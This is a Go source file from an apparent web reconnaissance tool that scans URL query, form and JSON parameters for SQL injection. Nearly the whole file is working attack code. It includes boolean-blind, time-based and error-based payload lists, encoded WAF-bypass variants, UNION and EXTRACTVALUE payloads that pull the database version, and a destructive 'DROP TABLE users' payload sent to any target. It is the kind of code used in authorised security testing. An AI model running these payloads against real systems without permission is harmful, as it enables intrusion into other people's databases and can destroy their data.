package sqli

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/bytezora/recon-x/internal/httpclient"
)

type Result struct {
	URL        string
	Param      string
	Payload    string
	Evidence   string
	Confidence string
	Method     string
	Detected   bool
}

var sqlErrors = []string{
	"You have an error in your SQL syntax",
	"Warning: mysql_",
	"mysql_fetch_array()",
	"mysql_num_rows()",
	"supplied argument is not a valid MySQL",
	"MySQLSyntaxErrorException",
	"com.mysql.jdbc.exceptions",
	"Unclosed quotation mark",
	"Microsoft OLE DB Provider for SQL Server",
	"Incorrect syntax near",
	"ODBC Microsoft Access Driver",
	"ODBC SQL Server Driver",
	"SQLServer JDBC Driver",
	"SqlException",
	"[Microsoft][ODBC SQL Server Driver]",
	"[SQL Server]",
	"ORA-00907",
	"ORA-00933",
	"ORA-00942",
	"ORA-01756",
	"ORA-00936",
	"Oracle error",
	"Oracle JDBC Driver",
	"oracle.jdbc",
	"SQLiteException",
	"SQLite/JDBCDriver",
	"System.Data.SQLite.SQLiteException",
	"sqlite3.OperationalError",
	"ERROR: syntax error at",
	"pg_query(): Query failed",
	"PSQLException",
	"org.postgresql.util.PSQLException",
	"PostgreSQL query failed",
	"PG::SyntaxError",
	"DB2 SQL error",
	"SQLCODE",
	"com.ibm.db2",
	"Sybase message",
	"Sybase Driver",
	"SybSQLException",
	"JDBC Error",
	"javax.servlet.ServletException",
	"java.lang.NullPointerException: null",
}

var boolTruePayloads = []struct{ raw, waf string }{
	{"1 AND 1=1--", "1%20AND%201%3D1--"},
	{"1' AND '1'='1'--", "1'%20AND%20'1'%3D'1'--"},
	{"1\" AND \"1\"=\"1\"--", "1\"+AND+\"1\"=\"1\"--"},
	{"1 AND 1=1#", "1/**/AND/**/1=1#"},
}

var boolFalsePayloads = []struct{ raw, waf string }{
	{"1 AND 1=2--", "1%20AND%201%3D2--"},
	{"1' AND '1'='2'--", "1'%20AND%20'1'%3D'2'--"},
	{"1\" AND \"1\"=\"2\"--", "1\"+AND+\"1\"=\"2\"--"},
	{"1 AND 1=2#", "1/**/AND/**/1=2#"},
}

var timePayloads = []struct {
	payload string
	dbType  string
	sleep   float64
}{
	{"1; WAITFOR DELAY '0:0:5'--", "mssql", 5},
	{"1'; WAITFOR DELAY '0:0:5'--", "mssql", 5},
	{"1 AND SLEEP(5)--", "mysql", 5},
	{"1' AND SLEEP(5)--", "mysql", 5},
	{"1 AND pg_sleep(5)--", "postgres", 5},
	{"1' AND pg_sleep(5)--", "postgres", 5},
	{"1;SELECT pg_sleep(5)--", "postgres", 5},
	{"1 AND 1=1 UNION SELECT sleep(5)--", "mysql", 5},
	{"1'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", "postgres", 5},
	{"1 OR SLEEP(5)=0 LIMIT 1--", "mysql", 5},
}

var errorPayloads = []string{
	"'",
	`"`,
	"'--",
	`"--`,
	"'/*",
	"1 OR 1=1",
	"1' OR '1'='1",
	"admin'--",
	"' OR 1=1--",
	"' OR 'x'='x",
	"1) OR (1=1",
	"' OR 1=1#",
	"1 UNION SELECT NULL--",
	"1' UNION SELECT NULL--",
	"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
	"1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
	"1; DROP TABLE users--",
}

type testResult struct {
	body       string
	statusCode int
	length     int
	hash       string
	elapsed    time.Duration
}

func fetchWithMeta(client *http.Client, method, rawURL, body, contentType string) testResult {
	var req *http.Request
	var err error
	start := time.Now()
	if method == "POST" && body != "" {
		req, err = http.NewRequest("POST", rawURL, strings.NewReader(body))
		if err != nil {
			return testResult{}
		}
		req.Header.Set("Content-Type", contentType)
	} else {
		req, err = http.NewRequest("GET", rawURL, nil)
		if err != nil {
			return testResult{}
		}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
	resp, err := client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return testResult{elapsed: elapsed}
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	h := sha256.Sum256(data)
	return testResult{
		body:       string(data),
		statusCode: resp.StatusCode,
		length:     len(data),
		hash:       hex.EncodeToString(h[:]),
		elapsed:    elapsed,
	}
}

func Detect(baseURLs []string, threads int, onFound func(Result)) []Result {
	if threads <= 0 {
		threads = 10
	}
	client := httpclient.New(15*time.Second, false)

	var (
		mu      sync.Mutex
		results []Result
		wg      sync.WaitGroup
		sem     = make(chan struct{}, threads)
		seen    = make(map[string]bool)
	)

	for _, rawURL := range baseURLs {
		sem <- struct{}{}
		wg.Add(1)
		go func(rawURL string) {
			defer func() { <-sem; wg.Done() }()
			found := testURL(client, rawURL)
			if len(found) > 0 {
				mu.Lock()
				for _, r := range found {
					key := r.URL + "|" + r.Param + "|" + r.Method
					if !seen[key] {
						seen[key] = true
						results = append(results, r)
						if onFound != nil {
							onFound(r)
						}
					}
				}
				mu.Unlock()
			}
		}(rawURL)
	}
	wg.Wait()
	return results
}

func testURL(client *http.Client, rawURL string) []Result {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}

	params := parsed.Query()
	if len(params) == 0 {
		return nil
	}

	baseline := fetchWithMeta(client, "GET", rawURL, "", "")
	if baseline.body == "" {
		return nil
	}

	var results []Result

	for param := range params {
		if r := testBooleanBlind(client, parsed, params, param, baseline); r != nil {
			results = append(results, *r)
			continue
		}
		if r := testTimeBased(client, parsed, params, param); r != nil {
			results = append(results, *r)
			continue
		}
		if r := testErrorBased(client, parsed, params, param, baseline); r != nil {
			results = append(results, *r)
		}
	}

	return results
}

func testBooleanBlind(client *http.Client, parsed *url.URL, params url.Values, param string, baseline testResult) *Result {
	for i, tp := range boolTruePayloads {
		if i >= len(boolFalsePayloads) {
			break
		}
		fp := boolFalsePayloads[i]

		trueParams := cloneParams(params)
		trueParams.Set(param, tp.raw)
		trueURL := *parsed
		trueURL.RawQuery = trueParams.Encode()

		falseParams := cloneParams(params)
		falseParams.Set(param, fp.raw)
		falseURL := *parsed
		falseURL.RawQuery = falseParams.Encode()

		trueRes := fetchWithMeta(client, "GET", trueURL.String(), "", "")
		falseRes := fetchWithMeta(client, "GET", falseURL.String(), "", "")

		if trueRes.body == "" || falseRes.body == "" {
			continue
		}

		trueMatchesBase := trueRes.hash == baseline.hash || lenSimilar(trueRes.length, baseline.length, 0.05)
		falseDiffers := falseRes.hash != trueRes.hash && !lenSimilar(falseRes.length, trueRes.length, 0.05)

		if trueMatchesBase && falseDiffers {
			return &Result{
				URL:        parsed.String(),
				Param:      param,
				Payload:    tp.raw,
				Evidence:   fmt.Sprintf("boolean blind: true response matches baseline (len=%d), false response differs (len=%d)", trueRes.length, falseRes.length),
				Confidence: "confirmed",
				Method:     "boolean-blind",
				Detected:   true,
			}
		}

		wafTrue := *parsed
		wafTrueParams := cloneParams(params)
		wafTrueParams.Set(param, tp.waf)
		wafTrue.RawQuery = wafTrueParams.Encode()

		wafFalse := *parsed
		wafFalseParams := cloneParams(params)
		wafFalseParams.Set(param, fp.waf)
		wafFalse.RawQuery = wafFalseParams.Encode()

		wtRes := fetchWithMeta(client, "GET", wafTrue.String(), "", "")
		wfRes := fetchWithMeta(client, "GET", wafFalse.String(), "", "")

		if wtRes.body == "" || wfRes.body == "" {
			continue
		}

		wafTrueMatch := wtRes.hash == baseline.hash || lenSimilar(wtRes.length, baseline.length, 0.05)
		wafFalseDiff := wfRes.hash != wtRes.hash && !lenSimilar(wfRes.length, wtRes.length, 0.05)

		if wafTrueMatch && wafFalseDiff {
			return &Result{
				URL:        parsed.String(),
				Param:      param,
				Payload:    tp.waf,
				Evidence:   fmt.Sprintf("boolean blind (WAF bypass): true len=%d, false len=%d", wtRes.length, wfRes.length),
				Confidence: "confirmed",
				Method:     "boolean-blind-waf",
				Detected:   true,
			}
		}
	}
	return nil
}

func testTimeBased(client *http.Client, parsed *url.URL, params url.Values, param string) *Result {
	timeClient := httpclient.New(20*time.Second, false)

	for _, tp := range timePayloads {
		testParams := cloneParams(params)
		testParams.Set(param, tp.payload)
		testU := *parsed
		testU.RawQuery = testParams.Encode()

		res := fetchWithMeta(timeClient, "GET", testU.String(), "", "")
		if res.elapsed >= time.Duration(tp.sleep-0.5)*time.Second {
			return &Result{
				URL:        parsed.String(),
				Param:      param,
				Payload:    tp.payload,
				Evidence:   fmt.Sprintf("time-based blind (%s): response delayed %.1fs (expected %.0fs)", tp.dbType, res.elapsed.Seconds(), tp.sleep),
				Confidence: "confirmed",
				Method:     "time-based-" + tp.dbType,
				Detected:   true,
			}
		}
	}
	return nil
}

func testErrorBased(client *http.Client, parsed *url.URL, params url.Values, param string, baseline testResult) *Result {
	for _, payload := range errorPayloads {
		testParams := cloneParams(params)
		testParams.Set(param, payload)
		testU := *parsed
		testU.RawQuery = testParams.Encode()

		res := fetchWithMeta(client, "GET", testU.String(), "", "")
		if res.body == "" {
			continue
		}

		bodyLower := strings.ToLower(res.body)
		for _, errStr := range sqlErrors {
			if strings.Contains(bodyLower, strings.ToLower(errStr)) {
				if !strings.Contains(strings.ToLower(baseline.body), strings.ToLower(errStr)) {
					confidence := "high"
					if !lenSimilar(res.length, baseline.length, 0.15) {
						confidence = "confirmed"
					}
					return &Result{
						URL:        parsed.String(),
						Param:      param,
						Payload:    payload,
						Evidence:   "SQL error in response: " + errStr,
						Confidence: confidence,
						Method:     "error-based",
						Detected:   true,
					}
				}
			}
		}
	}
	return nil
}

func TestPOST(client *http.Client, rawURL string, formFields map[string]string, onFound func(Result)) []Result {
	if client == nil {
		client = httpclient.New(15*time.Second, false)
	}

	formVals := url.Values{}
	for k, v := range formFields {
		formVals.Set(k, v)
	}
	baseBody := formVals.Encode()

	baseRes := fetchWithMeta(client, "POST", rawURL, baseBody, "application/x-www-form-urlencoded")
	if baseRes.body == "" {
		return nil
	}

	var results []Result
	for param := range formFields {
		if r := testPostBooleanBlind(client, rawURL, formFields, param, baseRes); r != nil {
			results = append(results, *r)
			if onFound != nil {
				onFound(*r)
			}
			continue
		}
		if r := testPostTimeBased(rawURL, formFields, param); r != nil {
			results = append(results, *r)
			if onFound != nil {
				onFound(*r)
			}
			continue
		}
		if r := testPostErrorBased(client, rawURL, formFields, param, baseRes); r != nil {
			results = append(results, *r)
			if onFound != nil {
				onFound(*r)
			}
		}
	}
	return results
}

func TestJSON(client *http.Client, rawURL string, bodyFields map[string]interface{}, onFound func(Result)) []Result {
	if client == nil {
		client = httpclient.New(15*time.Second, false)
	}

	baseBodyBytes, _ := json.Marshal(bodyFields)
	baseRes := fetchWithMeta(client, "POST", rawURL, string(baseBodyBytes), "application/json")
	if baseRes.body == "" {
		return nil
	}

	var results []Result
	for param, origVal := range bodyFields {
		origStr, ok := origVal.(string)
		if !ok {
			continue
		}
		for _, payload := range append(errorPayloads, "'", "1 AND 1=1--", "1 AND 1=2--") {
			injected := cloneJSON(bodyFields)
			injected[param] = origStr + payload
			injBytes, _ := json.Marshal(injected)
			res := fetchWithMeta(client, "POST", rawURL, string(injBytes), "application/json")
			if res.body == "" {
				continue
			}
			bodyLower := strings.ToLower(res.body)
			for _, errStr := range sqlErrors {
				if strings.Contains(bodyLower, strings.ToLower(errStr)) &&
					!strings.Contains(strings.ToLower(baseRes.body), strings.ToLower(errStr)) {
					r := Result{
						URL:        rawURL,
						Param:      param,
						Payload:    payload,
						Evidence:   "SQL error in JSON response: " + errStr,
						Confidence: "high",
						Method:     "error-based-json",
						Detected:   true,
					}
					results = append(results, r)
					if onFound != nil {
						onFound(r)
					}
					goto nextJSONParam
				}
			}
		}
	nextJSONParam:
	}
	return results
}

func testPostBooleanBlind(client *http.Client, rawURL string, fields map[string]string, param string, baseline testResult) *Result {
	for i, tp := range boolTruePayloads {
		if i >= len(boolFalsePayloads) {
			break
		}
		fp := boolFalsePayloads[i]

		trueFields := cloneMap(fields)
		trueFields[param] = tp.raw
		trueVals := url.Values{}
		for k, v := range trueFields {
			trueVals.Set(k, v)
		}

		falseFields := cloneMap(fields)
		falseFields[param] = fp.raw
		falseVals := url.Values{}
		for k, v := range falseFields {
			falseVals.Set(k, v)
		}

		trueRes := fetchWithMeta(client, "POST", rawURL, trueVals.Encode(), "application/x-www-form-urlencoded")
		falseRes := fetchWithMeta(client, "POST", rawURL, falseVals.Encode(), "application/x-www-form-urlencoded")

		if trueRes.body == "" || falseRes.body == "" {
			continue
		}

		if (trueRes.hash == baseline.hash || lenSimilar(trueRes.length, baseline.length, 0.05)) &&
			(falseRes.hash != trueRes.hash && !lenSimilar(falseRes.length, trueRes.length, 0.05)) {
			return &Result{
				URL:        rawURL,
				Param:      param,
				Payload:    tp.raw,
				Evidence:   fmt.Sprintf("POST boolean blind: true len=%d matches baseline=%d, false len=%d differs", trueRes.length, baseline.length, falseRes.length),
				Confidence: "confirmed",
				Method:     "boolean-blind-post",
				Detected:   true,
			}
		}
	}
	return nil
}

func testPostTimeBased(rawURL string, fields map[string]string, param string) *Result {
	timeClient := httpclient.New(20*time.Second, false)
	for _, tp := range timePayloads {
		injected := cloneMap(fields)
		injected[param] = fields[param] + tp.payload
		vals := url.Values{}
		for k, v := range injected {
			vals.Set(k, v)
		}
		res := fetchWithMeta(timeClient, "POST", rawURL, vals.Encode(), "application/x-www-form-urlencoded")
		if res.elapsed >= time.Duration(tp.sleep-0.5)*time.Second {
			return &Result{
				URL:        rawURL,
				Param:      param,
				Payload:    tp.payload,
				Evidence:   fmt.Sprintf("POST time-based (%s): %.1fs delay", tp.dbType, res.elapsed.Seconds()),
				Confidence: "confirmed",
				Method:     "time-based-post-" + tp.dbType,
				Detected:   true,
			}
		}
	}
	return nil
}

func testPostErrorBased(client *http.Client, rawURL string, fields map[string]string, param string, baseline testResult) *Result {
	for _, payload := range errorPayloads {
		injected := cloneMap(fields)
		injected[param] = fields[param] + payload
		vals := url.Values{}
		for k, v := range injected {
			vals.Set(k, v)
		}
		res := fetchWithMeta(client, "POST", rawURL, vals.Encode(), "application/x-www-form-urlencoded")
		if res.body == "" {
			continue
		}
		bodyLower := strings.ToLower(res.body)
		for _, errStr := range sqlErrors {
			if strings.Contains(bodyLower, strings.ToLower(errStr)) &&
				!strings.Contains(strings.ToLower(baseline.body), strings.ToLower(errStr)) {
				return &Result{
					URL:        rawURL,
					Param:      param,
					Payload:    payload,
					Evidence:   "POST SQL error: " + errStr,
					Confidence: "high",
					Method:     "error-based-post",
					Detected:   true,
				}
			}
		}
	}
	return nil
}

func lenSimilar(a, b int, threshold float64) bool {
	if a == 0 && b == 0 {
		return true
	}
	if a == 0 || b == 0 {
		return false
	}
	diff := a - b
	if diff < 0 {
		diff = -diff
	}
	larger := a
	if b > a {
		larger = b
	}
	return float64(diff)/float64(larger) <= threshold
}

func cloneParams(src url.Values) url.Values {
	dst := url.Values{}
	for k, v := range src {
		dst[k] = append([]string{}, v...)
	}
	return dst
}

func cloneMap(src map[string]string) map[string]string {
	dst := make(map[string]string, len(src))
	for k, v := range src {
		dst[k] = v
	}
	return dst
}

func cloneJSON(src map[string]interface{}) map[string]interface{} {
	dst := make(map[string]interface{}, len(src))
	for k, v := range src {
		dst[k] = v
	}
	return dst
}
